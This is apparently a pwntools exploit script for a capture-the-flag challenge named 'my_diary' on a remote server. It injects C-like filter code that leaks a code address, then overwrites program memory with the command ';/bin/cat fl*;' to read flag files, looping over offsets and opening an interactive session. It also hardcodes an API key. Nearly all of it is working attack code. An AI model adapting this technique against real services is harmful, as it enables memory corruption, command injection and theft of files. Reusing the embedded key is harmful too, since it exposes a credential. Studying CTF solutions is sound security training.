from pwn import *
import json

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# p = process('./attackme')

api_key = "ac261681692e300a406552de038cc01df05ef108e21857beac6c1c3dce6498d4"

a = {
      'apikey' : api_key,
}

script = ""

DEBUG = False

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info("Received:" + response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def write_diary(title, date, content):
  r("delete diary\n")
  s("1")

  r("title:")
  s(title)

  r("date:")
  s(date)

  r("\"</end>\")")
  s(content, False)

def show_diary():
  r("delete diary\n")
  s("2")

def set_filter(content):
  r("delete diary\n")
  s(str(0x1337))

  r("return 1;")
  s(content, False)

for i in range(0x1000):
  p = remote("my_diary.eatpwnnosleep.com", 18879)
  p.send(json.dumps(a).encode())

  offset = 0x203300 + 200 + i * 8

  content = "long long *ptr = arg;"
  content += "long long *addr = &arg + 12;"
  content += "char *code = *addr;"

  content += "code += 0x%x - 0x1d27 + 4;" % offset

  content += "addr = code;"

  content += "*ptr = *addr;"

  
  content += "*code = \';\';"
  content += "code += 1;"
  content += "*code = \'/\';"
  content += "code += 1;"
  content += "*code = \'b\';"
  content += "code += 1;"
  content += "*code = \'i\';"
  content += "code += 1;"
  content += "*code = \'n\';"
  content += "code += 1;"
  content += "*code = \'/\';"
  content += "code += 1;"
  content += "*code = \'c\';"
  content += "code += 1;"
  content += "*code = \'a\';"
  content += "code += 1;"
  content += "*code = \'t\';"
  content += "code += 1;"
  content += "*code = \' \';"
  content += "code += 1;"
  content += "*code = \'f\';"
  content += "code += 1;"
  content += "*code = \'l\';"
  content += "code += 1;"
  content += "*code = \'*\';"
  content += "code += 1;"

  content += "*code = \';\';"

  content += "return 1;\n"

  set_filter(content)

  content = "AAAA\n"
  content += "</end>\n"

  write_diary("A", "A", content)

  show_diary()

  r("date:")
  r("\n")
  r("\n")

  leak = r("\n")[:-1]

  print i, leak, leak.encode('hex')
  print "code: 0x%x" % u64(leak.ljust(8, "\x00"))

  set_filter(content)

  # gdb.attach(p, gdbscript=script)

  p.interactive()
  p.close()
